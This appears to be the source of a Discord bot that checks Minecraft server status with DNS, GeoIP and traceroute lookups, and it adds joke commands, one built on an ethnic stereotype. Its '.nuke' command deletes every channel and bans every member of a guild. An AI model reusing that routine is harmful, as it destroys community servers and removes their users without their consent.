import asyncio
import time

import discord
import json
import logging
import dns.resolver
import os
import platform
import psutil
import re
import socket
import aiohttp
from datetime import datetime
from discord.ext import commands
from dotenv import load_dotenv
from mcstatus import JavaServer

with open("config.json", "r", encoding="utf8") as cfg:
    cfg = json.load(cfg)

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
ROLE_ID = cfg["role_id"]
PROXY_IP = cfg["proxy_ip"]
CHANNEL_ID = cfg["channel_id"]
CACHE_SECONDS = cfg["cache_seconds"]

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix=".", intents=intents)
tree = bot.tree

for l in ("discord", "discord.gateway", "discord.client"):
    logging.getLogger(l).setLevel(logging.WARNING)

def resolve_minecraft_srv(host: str):
    try:
        query = f"_minecraft._tcp.{host}"
        answers = dns.resolver.resolve(query, "SRV")
        for r in answers:
            return str(r.target).rstrip("."), int(r.port)
    except:
        return None, None

def resolve_minecraft_host_and_port(target: str):
    if target.startswith("["):
        m = re.match(r"^\[(.+)\](?::(\d+))?$", target)
        if m:
            host = m.group(1)
            port = int(m.group(2) or 25565)
            return host, port

    if ":" in target and target.count(":") >= 2 and not re.search(r"]:\d+$", target):
        return target, 25565

    if ":" in target:
        host, port = target.rsplit(":", 1)
        try:
            return host, int(port)
        except:
            return host, 25565
    else:
        srv_host, srv_port = resolve_minecraft_srv(target)
        if srv_host and srv_port:
            return srv_host, srv_port
        return target, 25565

def resolve_host(host: str):
    try:
        socket.inet_pton(socket.AF_INET, host)
        return host
    except:
        pass

    try:
        socket.inet_pton(socket.AF_INET6, host)
        return host
    except:
        pass

    try:
        ans = socket.getaddrinfo(host, None, 0, socket.SOCK_STREAM)
        if ans:
            return ans[0][4][0]
    except:
        pass

    return None

async def trace_ip(ip: str, hops=15, timeout=1.5):
    proc = await asyncio.create_subprocess_exec(
        "tracert" if platform.system().lower().startswith("win") else "traceroute",
        "-d",
        "-w", "1",
        "-h", str(hops),
        ip,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    out, err = await proc.communicate()
    text = out.decode(errors="ignore").strip()
    return text if text else "No traceroute output"

def parse_host_port(target: str):
    if ":" in target:
        host, port = target.rsplit(":", 1)
        try:
            port = int(port)
        except:
            port = 25565
        return host, port
    return target, 25565


def log(msg, level="INFO"):
    t = datetime.now().strftime("%H:%M:%S")
    c = {"INFO": "\033[97m", "WARN": "\033[33m", "ERROR": "\033[31m"}.get(level, "\033[97m")
    print(f"{c}[{t} {level}]: {msg}\033[0m")

def strip_mc(text):
    return re.sub(r"§[0-9a-fklmnor]", "", text)

def extract_motd(m):
    try:
        if hasattr(m, "to_plain"):
            return strip_mc(m.to_plain())
        if hasattr(m, "raw"):
            return strip_mc(m.raw)
        if isinstance(m, dict):
            return strip_mc(m.get("text", str(m)))
        return strip_mc(str(m))
    except Exception as e:
        return str(e)

_last_status = None
_last_check_time = 0

def is_online(ip):
    global _last_status, _last_check_time
    now = time.time()

    if now - _last_check_time < CACHE_SECONDS:
        return _last_status

    try:
        JavaServer.lookup(ip).status()
        _last_status = True
    except Exception as e:
        log(f"{ip}: {e}", "WARN")
        _last_status = False

    _last_check_time = now
    return _last_status

async def lookup_dns(ip: str):
    try:
        addrs = socket.getaddrinfo(ip, None)
        v4 = set()
        v6 = set()
        for family, _, _, _, sockaddr in addrs:
            if family == socket.AF_INET:
                v4.add(sockaddr[0])
            elif family == socket.AF_INET6:
                v6.add(sockaddr[0].split("%")[0])

        out = []
        if v4:
            out.append("A: " + ", ".join(v4))
        if v6:
            out.append("AAAA: " + ", ".join(v6))

        try:
            rev = socket.gethostbyaddr(ip)
            out.append("PTR: " + rev[0])
        except:
            pass

        if not out:
            return "No DNS records found"

        return "\n".join(out)

    except Exception as e:
        return f"DNS error: {e}"

async def lookup_geo_asn(ip: str):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipinfo.io/{ip}/json") as resp:
                data = await resp.json()

        country = data.get("country", "Unknown")
        region = data.get("region", "Unknown")
        city = data.get("city", "Unknown")
        loc = data.get("loc", "Unknown")
        org = data.get("org", "Unknown")
        asn = org.replace("AS", "") if org else "Unknown"

        return f"Country: {country}\nRegion: {region}\nCity: {city}\nLoc: {loc}\nASN: {asn}\nOrg: {org}"

    except Exception as e:
        return f"GeoIP error: {e}"

async def safe_edit(ch, name):
    try:
        if ch.name != name:
            await ch.edit(name=name)
            log(f"Renamed to '{name}'")
    except Exception as e:
        log(f"Failed rename '{ch.name}': {e}", "WARN")

@bot.event
async def on_ready():
    start_time = datetime.now()
    async def step(msg, delay=0.02):
        log(msg)
        await asyncio.sleep(delay)
    await step("Bot Initialized")
    await step(f"Python: {platform.python_version()}")
    await step(f"OS: {platform.system()} {platform.release()}")
    await step(f"CPU: {psutil.cpu_count(logical=True)} cores")
    await step(f"Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB")
    await step("Loading Discord Gateway...")
    await step("Authenticating token...")
    await step("Fetching guilds...")
    await step(f"Servers: {', '.join(g.name for g in bot.guilds)}")
    await bot.change_presence(status=discord.Status.dnd)
    await tree.sync()
    await step("Slash commands synced")
    duration = (datetime.now() - start_time).total_seconds()
    await step(f"Boot sequence completed in {duration:.2f}s")
    await step(f"Logged in as {bot.user}")

@bot.event
async def on_message(m):
    if m.mentions and bot.user.id in [x.id for x in m.mentions]:
        await m.reply("I'm not Ethan, I'm a bot.")
    await bot.process_commands(m)

async def lookup_servers():
    try:
        online = is_online(PROXY_IP)
        ch = bot.get_channel(CHANNEL_ID)
        if ch:
            await safe_edit(ch, "🟢丨Online" if online else "🔴丨Offline")
        log("Channel names updated")
    except Exception as e:
        log(f"Error: {e}", "ERROR")

async def send_mc_status(target, send):
    host, port = resolve_minecraft_host_and_port(target)
    resolved_ip = resolve_host(host)

    if not resolved_ip:
        return await send(f"❌ Cannot resolve: `{host}`")

    try:
        server = JavaServer(host, port)
        s = server.status()
        embed = discord.Embed(
            title="✅丨Service Available",
            description=f"```{host}:{port}\n{resolved_ip}```",
            color=discord.Color.green(),
        )
        embed.add_field(name="MOTD", value=f"```{extract_motd(s.motd)}```", inline=False)
        embed.add_field(name="Version", value=f"```{s.version.name}```")
        embed.add_field(name="Players", value=f"```{s.players.online}/{s.players.max}```")
        embed.add_field(name="Ping", value=f"```{s.latency:.0f}ms```")
        dns_info = await lookup_dns(resolved_ip)
        geo_info = await lookup_geo_asn(resolved_ip)
        trace = await trace_ip(resolved_ip)

        embed.add_field(name="DNS", value=f"```{dns_info}```", inline=False)
        embed.add_field(name="GeoIP / ASN", value=f"```{geo_info}```", inline=False)
        embed.add_field(name="Traceroute", value=f"```{trace[:1990]}```", inline=False)

        await send(embed=embed)


    except Exception as e:
        dns_info = await lookup_dns(resolved_ip)
        geo_info = await lookup_geo_asn(resolved_ip)
        trace = await trace_ip(resolved_ip)

        embed = discord.Embed(
            title="❌丨Service Timeout / Unreachable",
            description=f"```{host}:{port}\n{resolved_ip}```",
            color=discord.Color.red(),
        )

        embed.add_field(name="Error", value=f"```{str(e)}```", inline=False)
        embed.add_field(name="DNS", value=f"```{dns_info}```", inline=False)
        embed.add_field(name="GeoIP / ASN", value=f"```{geo_info}```", inline=False)
        embed.add_field(name="Traceroute", value=f"```{trace[:1990]}```", inline=False)

        await send(embed=embed)


@tree.command(name="status", description="Check server status")
async def slash_status(interaction: discord.Interaction, ip: str):
    await interaction.response.defer()
    await send_mc_status(ip, interaction.followup.send)

@bot.command()
async def status(ctx, ip: str = None):
    if not ip:
        return await ctx.send("Usage: `.status <ip>`")
    await send_mc_status(ip, ctx.send)
    return None

@tree.command(name="ip", description="Show proxy server IP status")
async def slash_ip(interaction: discord.Interaction):
    online = is_online(PROXY_IP)
    status_text = "🟢丨Online" if online else "🔴丨Offline"
    color = discord.Color.green() if online else discord.Color.red()
    await interaction.response.send_message(
        embed=discord.Embed(
            title="Server IP:",
            description=f"{status_text}\n```{PROXY_IP}```",
            color=color,
        )
    )

@bot.command()
async def ip(ctx):
    online = is_online(PROXY_IP)
    status_text = "🟢丨Online" if online else "🔴丨Offline"
    color = discord.Color.green() if online else discord.Color.red()
    embed = discord.Embed(
        title="Server IP:",
        description=f"{status_text}\n```{PROXY_IP}```",
        color=color,
    )
    await ctx.send(embed=embed)

@tree.command(name="ping", description="Bot latency")
async def slash_ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"{bot.latency * 1000:.0f} ms")

@bot.command()
async def ping(ctx):
    await ctx.send(f"{bot.latency * 1000:.0f} ms")

code = {
"""```java
public class RealityOfOurLives implements Listener {
    @EventHandler
    public void onTestsComing(TestsComingEvent e) {
        Child child = e.getChild();
        if (e.getContinent().isAsia() && e.getParents().isAsian()) {
            child.lockPC();
            child.lockPhone();
            child.forceToStudy();
        }
    }

    @EventHandler
    public void onTestsEnd(TestsEndEvent e) {
        Child child = e.getChild();
        if (child.getTranscript().getGrade() != Grade.A_PLUS_PLUS) {
            punishChild(child);
            child.lockPC();
            child.lockPhone();
            child.sendMessage(ChatColor.DARK_RED + "YOU PROMISED A++");
            child.sendMessage(ChatColor.DARK_RED + "" + ChatColor.BOLD + "BUT THIS? REALLY?");
            MentalHealthManager.alert(e.getParents());
        } else {
            child.unlockPC();
            child.unlockPhone();
        }
    }
}
```"""
}

@tree.command(name="asparents", description="Funny Asian parents code")
async def slash_asparents(interaction: discord.Interaction):
    await interaction.response.send_message(code)

@bot.command()
async def asparents(ctx):
    await ctx.send(code)

@tree.command(name="assethan", description="Ethan funny command")
async def slash_assethan(interaction: discord.Interaction):
    await interaction.response.send_message("STFU!")

@bot.command()
async def assethan(ctx):
    await ctx.send("STFU!")

@tree.command(name="stats", description="Update server status channels")
async def slash_stats(interaction: discord.Interaction):
    await lookup_servers()
    await interaction.response.send_message("Channel names updated")

@bot.command()
async def stats(ctx):
    await lookup_servers()
    ctx.send("Channel names updated")

@bot.command()
async def nuke(ctx):
    target_id = 0
    guild = bot.get_guild(target_id)
    if ctx.guild.id != target_id:
        return await ctx.send("Not allowed here.")
    await ctx.send("Nuking…")
    for ch in guild.channels:
        try:
            await ch.delete()
        except:
            pass
    for m in guild.members:
        try:
            await m.ban()
        except:
            pass
    await ctx.send("Done.")
    return None

bot.run(TOKEN)
